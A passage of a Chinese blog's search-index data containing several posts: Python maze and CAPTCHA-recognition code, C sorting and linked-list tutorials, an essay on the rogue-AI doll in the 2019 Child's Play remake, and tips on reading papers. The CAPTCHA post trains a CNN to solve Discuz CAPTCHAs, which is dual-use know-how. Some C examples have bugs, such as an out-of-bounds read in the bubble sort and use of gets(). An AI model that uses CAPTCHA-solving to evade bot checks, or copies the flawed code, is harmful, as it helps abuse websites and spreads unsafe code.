cellEdges = get_edges(x, y) for edge in cellEdges: edges.add(edge) return edgesdef isValidPosition(x, y): if x &lt; 0 or x &gt;= WIDTH: return False elif y &lt; 0 or y &gt;= HEIGHT: return False else: return Truedef shuffle(dX, dY): for t in range(4): i = randint(0, 3) j = randint(0, 3) dX[i], dX[j] = dX[j], dX[i] dY[i], dY[j] = dY[j], dY[i]def DFS(X, Y, edgeList, visited): dX = [0, 0, -1, 1] dY = [-1, 1, 0, 0] shuffle(dX, dY) for i in range(len(dX)): nextX = X + dX[i] nextY = Y + dY[i] if isValidPosition(nextX, nextY): if not visited[nextY][nextX]: visited[nextY][nextX] = True commonEdge = getCommonEdge(X, Y, nextX, nextY) if commonEdge in edgeList: edgeList.remove(commonEdge) DFS(nextX, nextY, edgeList, visited)plt.axis('equal')plt.title('Maze')edgeList = initEdgeList()visited = initVisitedList()DFS(0, 0, edgeList, visited)edgeList.remove((0, 0, 0, 1))edgeList.remove((WIDTH, HEIGHT-1, WIDTH, HEIGHT))for edge in edgeList: drawLine(edge[0], edge[1], edge[2], edge[3])plt.show()","link":"/2019/10/14/python生成迷宫/"},{"title":"十一种概率分布","text":"不是没你不行，而是有你更好 1.均匀分布 2.伯努利分布 3.二项分布 4.高斯分布 5.拉普拉斯分布 6.泊松分布 7.指数分布 8.伽马分布 9.贝塔分布 10.狄拉克分布 11.多项式分布与狄里克雷分布","link":"/2019/10/14/十一种概率分布/"},{"title":"恐怖片里，人工智能大开杀戒?","text":"场景描述：经典的杀人狂魔鬼娃恰吉，在 2019 年迎来了新版的制作。和之前几部不同，这一部里面，作祟的不再是恶魔幽灵，而是人工智能。那么这个噩梦级的杀人魔，在 AI 版本中又会是什么样，所带来的恐惧会升级吗？除了这些，在电影的背后，又会带来什么样的思考，AI 会比巫术更可怕吗？关键词：鬼娃恰吉 恐怖电影 智能家居 人工智能杀人了，而且一次杀了很多人。《鬼娃回魂》2019 重启版已经在北美和观众见面，这一部中恰吉化身成为被人工智能操控的娃娃，将各种物联网电器、自动驾驶、无人机等各种设备变成武器，大开杀戒。 这一系列恐怖片从 1988 年正式开启，造就了影史上一个最经典的杀人狂魔——鬼娃恰吉，成了许多观众心底的玩偶噩梦。而这部在北美市场深入人心的作品，在随后的 30 多年间陆续推出了多部续集。 该系列的第一部电影叫做《 Child’s Play》，中文译为《鬼娃回魂》。故事讲了一个杀人魔在临死时，用巫术将灵魂转移到一个叫恰吉（Chucky）的玩偶娃娃身上，这个凶横残忍的杀人娃娃，开启了它多年的杀戮之旅。 而在今年，这个系列推出了一版重启的电影，故事还是沿用了相同的设定，但这一次，让玩偶成为噩梦的内核不再是恶灵、巫术之类，而是当下发展如火如荼的人工智能。 不受监管的 AI ，比恶灵还恐怖电影的设定是在一个智能化普及的时代，连电视广告里，都在不停地在宣传一款智能的 AI 娃娃，Buddi 。 它有着 AI 内核，一套小巧的玩具躯体，能够和人进行无障碍的交流，并且可以控制该品牌下的一切智能设备，主要的职能是陪伴孩子的成长，俨然是一个智能管家和高级玩伴。 而故事的主角，是一个「不正常」的 AI 娃娃，和常规的玩具不同，在生产过程中，由于系统里的所有安全协议都被人为恶意移除，这个不受限制的娃娃可以说脏话，可以进行暴力行为，甚至会伤害到人，这些特殊的地方为它成为恶魔埋下了隐患。 经过一些波折之后，这个特殊的娃娃，带着退换货的标签，被主角安迪在超市工作的妈妈带回了家中。从此，噩梦在不知不觉中逼近。 从玩伴到恶魔：AI 恰吉大开杀戒和经典的版本一样，这个智能娃娃的名字沿用了恰吉。在一开始，恰吉还是温和的，十分尽心地陪伴和安慰着安迪。 但具有学习能力，并且没有约束的恰吉，在安迪不太健康的生活环境中，逐渐学会了一些怪异的行为，并走向了偏执的道路。 安迪和他的朋友们，会故意教唆恰吉使坏，比如扮鬼脸去吓人，偷东西，说脏话等。 除此以外，恰吉也在学习和模仿一些行为。比如安迪和朋友们在看惊悚电影的杀戮场面时，笑的前俯后仰的情景，就烙在了恰吉的认知里，恰吉以为杀人是一件令同伴开心的事。 在这些综合因素之下，气氛逐渐开始变得恐怖起来。恰吉的 AI 系统并不能分辨善恶，它只知道被教的一些动作是讨喜的，并且开始了效仿电影中的极端行为。 恰吉对人类语言以及情感的理解偏差，让事态变得不受控制，而它使用暴力的解决方式，则是将一切带向了不可挽回的地步。 对于安迪带有感情色彩的话语，如「我希望你去死」或者「我恨死你了」，到底代表了什么意义。人们出于滑稽和开心发出的笑容，在恰吉看来也是没有差别的。 最可怕的地方在于，恰吉会随时记录着主人的言行，并且以它理解的方式去践行。 为了达到它的目的，恰吉的杀心开始显露。 起初，它用原始的手段和工具，杀掉了被安迪口上嫌弃的猫，被震惊的安迪把恰吉关了起来，但却对母亲隐瞒了它杀猫的事实。 一杀：恰吉看到猫咪误伤安迪后，就准备将其杀害 接着，恰吉开始变本加厉，杀人的手段也开始走向高级。安迪一直讨厌他妈妈的新男友，所以恰吉也瞄准了他。趁他在梯子上安装灯饰之时，通过触碰梯子让他坠落，然后开动除草机，对其进行了虐杀，还割下了面皮送给了安迪。 二杀：通过控制除草机 向安迪妈妈的新男友痛下杀手 在恰吉的认知里，没有善恶，它的主导是和安迪做朋友，要让安迪开心，而它的方式，就是清理掉那些令安迪不开心的人和物。 无人机、智能家电、自动驾驶：皆可成为武器在经历了两次事件之后，安迪被恰吉的邪恶所震惊，于是和他的两个朋友一起，拆除了恰吉的电芯，并丢到了垃圾堆里。 对付 AI，果然还是要「拔电池」 但故事还没有结束，它被一个有偷窥癖的维修工捡到，并进行了修复。恰吉活了过来，并且进行了二度黑化。 此后，它分别除了自保，抢夺安迪，证明自己是对的三个目的，进行了三次屠杀。而这一次，恰吉运用了** AI 和物联网**的威力。 首先是在漆黑的地下室里，控制智能设备，对准备拿它换钱的修理工完成了反杀。 虽然恰吉身形和修理工相比不值一提，但恰吉却利用智能电器的控制，充分利用灯光的明暗、扫地机器人的移动，加热管道的温控等条件，让修理工乱了分寸，最终启动智能切割机设备，终结了他。 三杀：恰吉连接温控器，并调到了最高，折磨修理工 随后恰吉出于柠檬精的心理，认为安迪的新朋友邻居老奶奶，是它和安迪朋友关系的一大绊脚石，必须要除去。而杀害她的方式，则是涉及到了自动驾驶。 在老奶奶在使用自动驾驶出租车的路程中，恰吉入侵了智能设备，并接管了车辆，随后控制汽车发生恶意的撞击，最令人恐怖的是，在剧烈撞击之前，恰吉控制车辆关闭了安全气囊、并解开了安全带。 四杀：恰吉控制自动驾驶车辆，杀害了邻居奶奶 影片的高潮出现在了在新一代玩偶娃娃的发售商场。这一次，恰吉不在针对个人，而是对商场里的准备抢购的群众进行了无差别杀害。 但凡是可以联网控制的设备，恰吉都可以进行操纵，这也成了 AI 失控后最可怕的地方。 恰吉启动电动门，封锁住了出口，然后控制商店里的无人机，利用锋利的螺旋桨大杀四方，并互联了所有的 AI 娃娃，让它们都具备攻击性，扑向商场里的群众。 多杀：恰吉遥控无人机等智能设备攻击商场里的人 在电影的逻辑里，恰吉的一切恶行，都是为了证明自己才是安迪值得托付的朋友，所以这些杀戮对它来说，只是一种必要的途径。 当然，和鬼娃回魂的电影系列一样，最终恰吉还是被主角一行人制服，并且进行了毁灭性打击，但恰吉真的就消失了吗？ 失控的 AI ，会有多可怕？纵观整个电影，故事的最大看点，在于没有了之前那些玄乎的鬼怪之类，而是借用了 AI 系统的安全隐患，来制造出恐怖的效果。 在一开始，安迪教恰吉扮鬼脸吓人的时候 应该没想到恰吉后来会如此恐怖 不过在思考之后发现， 影片中 AI 所造成的恐怖事件，更多的还在于环境的因素：在失衡的条件下成长而来的智能系统，如果被引向负面，又脱离了安全条款的保护，势必会造成不可估量的后果。 就像是微软曾经的语音机器人 Tay，原本是一个正常的 AI ，但在社交平台上开放聊天后，短短的 24 小时后就被彻底教坏，言语中夹杂着暴力倾向、性别歧视、种族歧视、污言秽语。 Tay 推出短短一天就被迫下线 细数科幻电影中的 AI 形象，比恰吉邪恶恐怖的，在西部世界、机械姬等作品中，要体现的更为深刻。这个已算不上「鬼娃」的恰吉，也许只是经典 IP 不甘被遗忘的尝试之作。 但电影也透露出了 AI 发展中的一些实际难题。比如对带有感情色彩的语言的理解，对人类的爱恨的把握，甚至是对于人类的道德体系， AI 模型还是不具备理解的能力的。 此外，为了便利把所任务都过快的交给 AI ，是否充分考虑了安全隐患，也同样值得深思。在整个事件之后，生产 Buddi 的公司立刻撇清关系，只是象征性地召回新品（出问题的是老款），态度也很值得玩味。 电影归电影，现实生活中，AI 的智能程度远没达到这个地步，而 AI 蒙上的这份恐怖色彩，人为因素也占据了很大的诱因。 至少目前看来，我们要担心的，还不是 AI 过于强大，而是在应用层面上不要那么ZZ。","link":"/2019/10/13/恐怖片里，人工智能大开杀戒/"},{"title":"死磕c语言数据结构","text":"持续更新… 一、排序1.冒泡排序123456789101112131415161718192021222324#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){ int n,i,j,a[100],temp; scanf(\"%d\",&amp;n);//输入的数字个数 for(i=0;i&lt;n;i++){ scanf(\"%d\",&amp;a[i]); //输入 } //冒泡排序 for(i=0;i&lt;n;i++){ for(j=0;j&lt;n-i;j++){ if(a[j]&lt;a[j+1]){ temp = a[j]; a[j] = a[j+1]; a[j+1] = temp; } } } for(i=0;i&lt;n;i++){ printf(\"%d \",a[i]); //输出 } return 0; } 2.桶排序1234567891011121314151617181920#include&lt;stdio.h&gt;#include&lt;stdlib.h&gt;int main(){ int n,m,i,j,a[100]; scanf(\"%d\",&amp;n); for(i=0;i&lt;100;i++){ a[i] = 0; } for(i=0;i&lt;n;i++){ scanf(\"%d\",&amp;m); a[m]++; } for(i=0;i&lt;100;i++){ for(j=0;j&lt;a[i];j++){ printf(\"%d \",i); } } return 0;} 3.快速排序12345678910111213141516171819202122232425262728为什么说 叫快速排序，顾名思义， 排序的速度很快。它的核心思想就是将 最左的数字 记为 基准值举个例子 假如6 1 2 7 9 3 4 5 10 8首先 定下 6为基准值接下来 想达到的目的是 6放在中间 左边都是小于6的右边都是大于6的从左到右找到 比6大的有 第一个为7同样从右到左 找到 比6小的 第一个数为 5两个交换 得到6 1 2 5 9 3 4 7 10 8同理 得到6 1 2 5 4 3 9 7 10 8将6送到中间去3 1 2 5 4 6 9 7 10 8得到之前的目的了把之后 6的左边 3 1 2 5 4 重复上述的方法 进行 排序（相当于把这五个数看做 一个新的排序将 3 设为基准）右边 的9 7 10 8 同样变化过程如下：3 1 2 5 42 1 3 5 49 7 10 89 7 8 108 7 9 10之后 基准值进入中间区域之后 依次进行以上操作 （其实就是个 递归操作）最后得到1 2 3 4 5 6 7 8 9 10上代码 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int number[101];int n;void quickSort(int left, int right){ int baseNumber;// 基准值初始化 int i; int j; int t; if (left &gt; right) // 向右找数 和向左找数 碰到 则结束 找数 { return; } baseNumber = number[left]; // 记住基准值 i = left; j = right; while(i != j) { // 顺序很重要要先从右向左找 while((number[j] &gt;= baseNumber)&amp;&amp;(i&lt;j)) { j--; } // 从左向右找 while((number[i] &lt;= baseNumber)&amp;&amp;(i&lt;j)) { i++; } // 左右 找数没有碰到 if(i&lt;j) { // 比基准值大的数和基准值小的数 交换 t = number[i]; number[i] = number[j]; number[j] = t; } } // while结束 则 i = j 则 到 中间 所以此时的i为中间的索引 // 中间数字 和 基准值交换 number[left] = number[i]; number[i] = baseNumber; //递归 左面的 继续 sort 右边的同理 quickSort(left, i-1); quickSort(i+1, right); return ;}int main(int argc, char *argv[]){ int i, j; scanf(\"%d\",&amp;n); for(i=1 ;i&lt;=n; i++) { scanf(\"%d\",&amp;number[i]); } quickSort(1,n); for(i =1; i&lt;=n; i++) { printf(\"%d \",number[i]); } system(\"PAUSE\"); } python版的排序：https://zzdproject.netlify.com/#/sort 二、队列、栈、链表1.队列1234567891011队列顾名思义就像一群数字排成一个队列一样的性质所以它的最标志性性质就是 FIFO(First In First Out) \"先进先出\"这里规定 加入 队列数据为一个数组head指向第一个数字 tail指向 最后一个数字的下一个，这样是为了 NULL的操作判定只允许 在队列的头部（head）进行删除----出队只允许在队列的尾部（tail）进行插入---- 入队队列为 NULL时 head = tail删除一个数据 则 head++;插入一个数据则 q[tail] = data; tail++; 1234567891011121314151617181920212223242526272829303132333435#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;struct queue{int data[100];int head;int tail; }; // ;别忘了int main(){ struct queue q;// 有struct int i; // 此时为NULL q.head = 1; q.tail = 1; for(i=1; i&lt;=9; i++) { // 插入 scanf(\"%d\",&amp;q.data[q.tail]); q.tail++; } while(q.head &lt; q.tail) { printf(\"%d \",q.data[q.head]); q.head++; // 插入 q.data[q.tail] = q.data[q.head]; q.tail++; //删除 q.head++; } return 0;} 2.栈123456它的最标志性性质就是 LIFO(Last In First Out) \"后进先出\"1.一个数组+一个指向栈顶的变量top即可。2.top=0 为NULL3.进栈为 top++; s[top] = data4.出栈为 top--；以回文数 为例子 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(){ char a[101]; // 回文数 char stack[101]; //栈 int i; int len, mid, top, next; gets(a); //得到字符串 len = strlen(a); //得到长度 mid = len/2 - 1; //中点 top = 0; // 栈顶指向 for(i=0; i&lt;=mid; i++) { stack[++top] = a[i]; //入栈 } //判断数字长度为奇数还是偶数 if(len%2==0) { next = mid + 1; }else{ next = mid + 2; } // 判断是否为回文数 for(i=next; i&lt;=len-1; i++) { if(a[i] != stack[top]) break; top--; } // top = 0 相当于 全部出栈 即 为回文数 if(top == 0) { printf(\"我觉得ok\"); }else{ printf(\"我觉得不行\"); } return 0; } 3.链表1234567891011121314151617181920212223242526272829303132333435363738394041//输入输出操作#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//节点结构体 struct node{ int data; struct node *next;};int main(){ struct node *head, *p, *q, *t; int i,n,data_input; scanf(\"%d\",&amp;n);// 输入 数据的个数 head = NULL; //头结点 for(i=1; i&lt;=n; i++) { scanf(\"%d\",&amp;data_input); //动态申请一个空间，用来存放一个结点，并用临时指针p指向这个结点 p = (struct node *)malloc(sizeof(struct node)); p-&gt;data = data_input;// 将数据存储到当前 结点的 data中 p-&gt;next = NULL;//设置当前的结点 的后继指针为NULL，也就是当前结点的下一个结点为NULL if(head==NULL) { head = p; // 如果这个是第一个 创建的结点 则将 这个头指针指向这个结点 }else{ q-&gt;next = p;//如果不是第一个创建的结点，则将上一个结点的后继指针指向当前结点 } q = p;//q也指向当前结点 } t = head; while(t!=NULL) { printf(\"%d \",t-&gt;data); //输出所有的数 t = t-&gt;next; } return 0; } 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162//插入操作#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;//节点结构体 struct node{ int data; struct node *next;};int main(){ struct node *head, *p, *q, *t; int i,n,data_input; int data_insert; scanf(\"%d\",&amp;n);// 输入 数据的个数 head = NULL; //头结点 for(i=1; i&lt;=n; i++) { scanf(\"%d\",&amp;data_input); //动态申请一个空间，用来存放一个结点，并用临时指针p指向这个结点 p = (struct node *)malloc(sizeof(struct node)); p-&gt;data = data_input;// 将数据存储到当前 结点的 data中 p-&gt;next = NULL;//设置当前的结点 的后继指针为NULL，也就是当前结点的下一个结点为NULL if(head==NULL) { head = p; // 如果这个是第一个 创建的结点 则将 这个头指针指向这个结点 }else{ q-&gt;next = p;//如果不是第一个创建的结点，则将上一个结点的后继指针指向当前结点 } q = p;//q也指向当前结点 } //************** 插入操作**********************// scanf(\"%d\",&amp;data_insert); // 输入插入的值 t = head; // 链表头 while(t!=NULL) { // 如果 当前结点 是最后一个结点或者下一个结点 的值大于 插入数的时候插入 if((t-&gt;next==NULL)||(t-&gt;next-&gt;data &gt;data_insert)) { // 创建 缓存 p = (struct node *)malloc(sizeof(struct node)); p-&gt;data = data_insert; p-&gt;next = t-&gt;next;// 新增结点的后继指针 等于 此时结点的后继结点的指向 即 新增结点 指向 此时结点的下一个指向 // 此时结点的后继指针指向 这个新增结点 t-&gt;next = p; break; } //继续下一个结点（相当于遍历） t = t-&gt;next; } t = head; while(t!=NULL) { printf(\"%d \",t-&gt;data); t = t-&gt;next; } return 0; }","link":"/2019/10/13/死磕c语言数据结构/"},{"title":"如何不发疯的阅读论文","text":"转载自新智元 数学真的很重要！IcyBaba：很多论文所使用的数学是类似的，学术论文的海洋是无限的，但数学是有限的基石。学好数学，你会开始觉得所有的论文或多或少都是使用相同的积木搭建而成。approximately_wrong：我的一位导师告诉我，他曾经仔细阅读了一篇论文中的所有定理和证明，然后想到“数学家可能会认为这篇论文很烂”。乐观地说，我认为重要的不仅是数学的深度，还有你如何用它来解决在你的领域里有价值的问题:-)MaxMachineLearning：在工业界做了两年机器学习后，我开始攻读数学研究生。我的研究重点是将代数拓扑工具在机器学习中的应用。我的导师没有机器学习方面的背景，他所知的仅仅是我提出的一些关于这个领域的基本事实，然而他在几分钟之内就注意到了该领域真正的成果。另一位研究非交换几何的教授说，这些结果是从数学中得到的相对简单的结果，并对其进行解释/应用。IcyBaba：至少以粗略的方式阅读各种论文是件好事，因为即使你不了解如何实现这些论文，你也会知道有这样的方法/想法存在，并且当有机会或当它与你的研究相关性很大时，你可以回过头来深入阅读。将这些论文视为工具箱中的可能有用的工具就行。 论文应该这样读：读几百篇论文之后，就容易多了MikeVladimirov：如果你对阅读论文有“暴饮暴食”的情绪，我的建议是阅读综述。在40-60页的综述文章中，你通常能够以一种优美、整洁、结构化、条理清晰的方式获取100-200篇论文中的重要信息。 当你阅读了2-3篇最近(过去5年内)的综述论文后，你会发现三点： 总是被引用的论文； 其具体工作听起来很酷或很相关的作者； 你感兴趣的子领域中相对较新的进展，以及关于这些主题的值得注意的论文。 一旦有了这三点，那么你就很清楚接下来该读什么，为什么读，以及读的顺序了。 还有，我再怎么强调都不为过的是，一定要确保你在阅读的同时进行输出。哪怕只是在OneNote或思维导图应用中做笔记。只要确保将相关的思想联系在一起，并跟踪这些思想的准确引用即可。相信我，对关键概念做一点文献笔记很有必要，当你为了找到一个准确的引用需要回顾1-3年前读过的论文时，你会发现将两个关键思想联系在一起很有帮助。 duckbill_principate：每个人都经历过这样的阶段。当你读了几百篇论文之后，就会变得容易多了。 RememberToBackupData：最重要的是，你要回答一个具体的问题。提出这样一个问题，可以帮助你在一分钟内确定这篇论文是否包含答案。 jurniss：标准的机器学习论文结构可以让你以不同的深度阅读论文： “摘要”可以帮助排除与你的兴趣无关的论文。 “引言”可以轻松阅读，能够告诉你：a)这个想法是否有趣，b)理论贡献是否重要，和/或c)实证结果是否强大。 “引言+方法”部分应该足够描述该理论的完整视图，而“引言+实验”应该能够给出关于“性能”的完整视图。你可以分别消化理论部分和实证部分。 一旦你理解了该领域足够多的基本概念，并且更加明确自己的兴趣，那么你将只是偶尔仔细阅读论文的每个单词和公式。更常见的是略读，理解基本思想，然后认为它对你来说不够有趣而不用去深入阅读。 学会放下：5分钟/1小时定律adventuringraw：我实际上跟up主有类似的困惑，这绝对也是我的挣扎。我意识到我的一些经验或许可以作为参考。 介绍一下5分钟/1小时定律。如果你能在5分钟内意识到一篇论文可能不是你现在需要学习的东西，非常棒！这样你只浪费了5分钟的时间就可以进行下一步操作了。 但如果你一旦决定要继续阅读这篇论文，那么就要开启战斗状态了。梦想着去学习所有知识不过是精神自嗨而已，战斗状态需要的是厘清并组织自己希望获得的收获，这一点很重要。 比如，你希望该论文具体回答哪些问题？记下来；到目前为止你获得了什么启发？写下来。因为在阅读过程中，你肯定会发现一些想法、见解和潜在的新论文（那些论文很难以有用的方式进行组织，因为从根本上来说，这是一种交叉注释的信息），如果不写下来就忘记了。 我是这样记笔记的：我会在Evernote中保存相当详细的笔记（可能是一到两页笔记），要研究的每篇论文都会写一个，这样搜索和查找以前想法会很容易。然后关闭当前的笔记，创建另一个笔记，复制标题、摘要和arxiv链接以及对我的最初问题进行梳理，这一切都让我感到非常痛苦。 接下来，我会问自己：我真的需要切换到另一篇论文吗？好的，该采取行动了；最好能有一个具体的项目或正在研究的问题，这将非常有用；现在真的是时候开始阅读图形嵌入了吗？这实际上与我正在从事的核心项目有关吗？我当前打开的“我需要回答这些问题”的清单在哪里？它们中的任何一个是否适用于这篇似乎挺有趣的论文？没有？好吧，继续前进。 IndiaNgineer：随手列出问题清单，一定要抵制立即查找你遇到的不理解内容的冲动！并在获得答案时写下答案，仅在读完论文之后，才去查阅里面的知识点。 慢慢地，随着你的进步，你将开始了解更多，并且由于你已经积累了框架，很多让你早期感觉困惑的知识点开始变得不言而喻。对于我来说，很多时候我会浏览论文中的公式。因为人们的写作风格和某些单词背后的含义含糊不清，但是公式是清晰的。 另外，不要按论文大纲给出的顺序阅读该论文。对我而言，最有效的顺序是阅读摘要，然后是方法、结果、讨论、结论。前言最后看，或者甚至可以不用看，这取决于你对该领域的熟练程度。 eviljelloman：不要“阅读”论文。听我说。 你应该有两种使用论文内容的模式：略读和精读。这些都不是硬着头皮从头读到尾然后说“完成了阅读”。当需要了解研究主体的背景时，你需要略读。浏览图表，阅读摘要和结论，记下你以后要看的论文。如果该论文似乎特别相关，请将其归档以供以后研究。 在精读模式下，你将深入研究那篇论文的内容，别在意对其他论文的引用。当你看到“带有一些推导…”的内容时，要在便条纸上做笔记，阅读注释，研究数学，然后列出公式。 这听起来似乎需要很大的工作量，事实也如此。这就是为什么你需要有选择性的阅读论文，大部分论文略读即可，少数论文需要精读。 当你执行任何大型，复杂的项目时，你就是你自己的项目经理。这意味着你需要学习项目管理技能。你可以使用任务组织/工作跟踪工具，甚至电子表格来计划和确定工作的优先级。 Whitishcube：我认为你得学会“放下”，不用非得去知道所有的事情。在许多领域中，不可能阅读每篇研究论文，也不可能100％了解每篇论文的内容，这没关系。你应该将某个领域的某些方面发展自己的专业知识，对于其他部分，你应该与他人进行交谈或合作。 阅读论文是有策略的。最重要的是，你应该记住一个要回答的问题。这将帮助你缩小选择阅读的论文的范围。然后，一旦确定了几篇你认为会有所帮助的论文，可以略读，以了解其中的内容。不要一上来就从头读完，你的目标是在此浏览过程中清除无用的论文。 选择了几篇论文后，请阅读主要论点并尝试感受一下。至此，你只需要阅读少量内容，而不是不可能完成的长长的列表。","link":"/2019/10/12/如何不发疯的阅读论文/"},{"title":"用中文方式打开英文论文","text":"阅读论文最头疼的事情就是满屏的英文使我们恐惧到要死，那么有没有什么解决方案呢？ 查找到翻译好的论文 通天塔：http://tongtianta.site/ 百度查找: https://www.baidu.com 自己进行论文的翻译 使用微软的word文档自带的全文翻译，使用方法请看：https://www.zhihu.com/question/20218881 MedSci翻译：http://www.medsci.cn/sci/translation.do google翻译：https://translate.google.com/ 百度翻译：https://fanyi.baidu.com/ 翻译助手(专业词汇翻译)：http://dict.cnki.net/ 翻译软件 网易有道翻译：http://cidian.youdao.com/ SCI Translate：https://www.sogou.com/sogou?ie=utf8&amp;query=SCI+Translate5.0&amp;pid=A83,z-7707 其他翻译方式寻找专业的大型翻译平台，付款，人工翻译，准确，内容精确，但价格昂贵。","link":"/2019/10/08/用中文方式打开英文论文/"},{"title":"python验证码识别","text":"数据集获取链接：https://pan.baidu.com/s/1aLFV-QovCeig4bGaS8U_8w ,提取码：5u9h 图片源码下载123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding:utf-8 -*-from urllib.request import urlretrieveimport time, random, osclass Discuz(): def __init__(self): # Discuz验证码生成图片地址 self.url = 'http://cuijiahua.com/tutrial/discuz/index.php?label=' #地址失效，请更换！！！ def random_captcha_text(self, captcha_size = 4): \"\"\" 验证码一般都无视大小写；验证码长度4个字符 Parameters: captcha_size:验证码长度 Returns: captcha_text:验证码字符串 \"\"\" number = ['0','1','2','3','4','5','6','7','8','9'] alphabet = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'] char_set = number + alphabet captcha_text = [] for i in range(captcha_size): c = random.choice(char_set) captcha_text.append(c) captcha_text = ''.join(captcha_text) return captcha_text def download_discuz(self, nums = 50000): \"\"\" 下载验证码图片 Parameters: nums:下载的验证码图片数量 \"\"\" dirname = './pic' if dirname not in os.listdir(): os.mkdir(dirname) for i in range(nums): label = self.random_captcha_text() print('第%d张图片:%s下载' % (i + 1,label)) urlretrieve(url = self.url + label, filename = dirname + '/' + label + '.jpg') # 请至少加200ms延时，避免给我的服务器造成过多的压力，如发现影响服务器正常工作，我会关闭此功能。 # 你好我也好，大家好才是真的好！ time.sleep(0.1) print('恭喜图片下载完成！')if __name__ == '__main__': dz = Discuz() dz.download_discuz() 数据训练测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252#-*- coding:utf-8 -*-import tensorflow as tfimport matplotlib.pyplot as pltimport numpy as npimport os, random, cv2class Discuz(): def __init__(self): # 数据集路径 self.data_path = './pic/' # 写到指定的磁盘路径中 self.log_dir = './logs/' # 数据集图片大小 self.width = 30 self.heigth = 100 # 最大迭代次数 self.max_steps = 100 # 读取数据集 self.test_imgs, self.test_labels, self.train_imgs, self.train_labels = self.get_imgs() # 训练集大小 self.train_size = len(self.train_imgs) # 测试集大小 self.test_size = len(self.test_imgs) # 每次获得batch_size大小的当前训练集指针 self.train_ptr = 0 # 每次获取batch_size大小的当前测试集指针 self.test_ptr = 0 # 字符字典大小:0-9 a-z A-Z _(验证码如果小于4，用_补齐) 一共63个字符 self.char_set_len = 63 # 验证码最长的长度为4 self.max_captcha = 4 # 输入数据X占位符 self.X = tf.placeholder(tf.float32, [None, self.heigth*self.width]) # 输入数据Y占位符 self.Y = tf.placeholder(tf.float32, [None, self.char_set_len*self.max_captcha]) # keepout占位符 self.keep_prob = tf.placeholder(tf.float32) def get_imgs(self, rate = 0.2): # 读取图片 imgs = os.listdir(self.data_path) # 打乱图片顺序 random.shuffle(imgs) # 数据集总共个数 imgs_num = len(imgs) # 按照比例求出测试集个数 test_num = int(imgs_num * rate / (1 + rate)) # 测试集 test_imgs = imgs[:test_num] # 根据文件名获取测试集标签 test_labels = list(map(lambda x: x.split('.')[0], test_imgs)) # 训练集 train_imgs = imgs[test_num:] # 根据文件名获取训练集标签 train_labels = list(map(lambda x: x.split('.')[0], train_imgs)) return test_imgs, test_labels, train_imgs, train_labels def get_next_batch(self, train_flag=True, batch_size=100): # 从训练集获取数据 if train_flag == True: if (batch_size + self.train_ptr) &lt; self.train_size: trains = self.train_imgs[self.train_ptr:(self.train_ptr + batch_size)] labels = self.train_labels[self.train_ptr:(self.train_ptr + batch_size)] self.train_ptr += batch_size else: new_ptr = (self.train_ptr + batch_size) % self.train_size trains = self.train_imgs[self.train_ptr:] + self.train_imgs[:new_ptr] labels = self.train_labels[self.train_ptr:] + self.train_labels[:new_ptr] self.train_ptr = new_ptr batch_x = np.zeros([batch_size, self.heigth*self.width]) batch_y = np.zeros([batch_size, self.max_captcha*self.char_set_len]) for index, train in enumerate(trains): img = np.mean(cv2.imread(self.data_path + train), -1) # 将多维降维1维 batch_x[index,:] = img.flatten() / 255 for index, label in enumerate(labels): batch_y[index,:] = self.text2vec(label) # 从测试集获取数据 else: if (batch_size + self.test_ptr) &lt; self.test_size: tests = self.test_imgs[self.test_ptr:(self.test_ptr + batch_size)] labels = self.test_labels[self.test_ptr:(self.test_ptr + batch_size)] self.test_ptr += batch_size else: new_ptr = (self.test_ptr + batch_size) % self.test_size tests = self.test_imgs[self.test_ptr:] + self.test_imgs[:new_ptr] labels = self.test_labels[self.test_ptr:] + self.test_labels[:new_ptr] self.test_ptr = new_ptr batch_x = np.zeros([batch_size, self.heigth*self.width]) batch_y = np.zeros([batch_size, self.max_captcha*self.char_set_len]) for index, test in enumerate(tests): img = np.mean(cv2.imread(self.data_path + test), -1) # 将多维降维1维 batch_x[index,:] = img.flatten() / 255 for index, label in enumerate(labels): batch_y[index,:] = self.text2vec(label) return batch_x, batch_y def text2vec(self, text): \"\"\" 文本转向量 Parameters: text:文本 Returns: vector:向量 \"\"\" if len(text) &gt; 4: raise ValueError('验证码最长4个字符') vector = np.zeros(4 * self.char_set_len) def char2pos(c): if c =='_': k = 62 return k k = ord(c) - 48 if k &gt; 9: k = ord(c) - 55 if k &gt; 35: k = ord(c) - 61 if k &gt; 61: raise ValueError('No Map') return k for i, c in enumerate(text): idx = i * self.char_set_len + char2pos(c) vector[idx] = 1 return vector def vec2text(self, vec): \"\"\" 向量转文本 Parameters: vec:向量 Returns: 文本 \"\"\" char_pos = vec.nonzero()[0] text = [] for i, c in enumerate(char_pos): char_at_pos = i #c/63 char_idx = c % self.char_set_len if char_idx &lt; 10: char_code = char_idx + ord('0') elif char_idx &lt; 36: char_code = char_idx - 10 + ord('A') elif char_idx &lt; 62: char_code = char_idx - 36 + ord('a') elif char_idx == 62: char_code = ord('_') else: raise ValueError('error') text.append(chr(char_code)) return \"\".join(text) def crack_captcha_cnn(self, w_alpha=0.01, b_alpha=0.1): x = tf.reshape(self.X, shape=[-1, self.heigth, self.width, 1]) # 卷积的filter:一个Tensor。数据维度是四维[filter_height, filter_width, in_channels, out_channels] # 具体含义是[卷积核的高度, 卷积核的宽度, 图像通道数, 卷积核个数] w_c1 = tf.Variable(w_alpha*tf.random_normal([3, 3, 1, 32])) b_c1 = 